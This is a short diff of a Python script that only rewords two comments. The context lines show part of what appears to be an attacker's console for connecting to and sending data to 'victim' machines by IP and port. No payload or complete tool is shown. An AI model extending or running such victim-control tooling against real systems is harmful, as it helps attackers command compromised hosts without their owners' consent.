@@ -39,7 +39,7 @@ if __name__ == '__main__':
             elif sock is sys.stdin:
                 command = sys.stdin.readline().strip()
 
-                if command == "connect":  # Connect to victim
+                if command == "connect":  # a) For Connecting to victim
                     target_ip = input("[+] Enter target IP address: ")
                     target_port = int(input("[+] Enter target port: "))
                     try:
@@ -54,7 +54,7 @@ if __name__ == '__main__':
                     except Exception as e:
                         print("[+] Connection error:", str(e))
 
-                if command == "send":  # Send to a specific victim
+                if command == "send":  # For Sending things to a specific victim
                     target_socket = None
                     target_ip = input("[+] Enter target IP address: ")
                     target_port = int(input("[+] Enter target port: "))
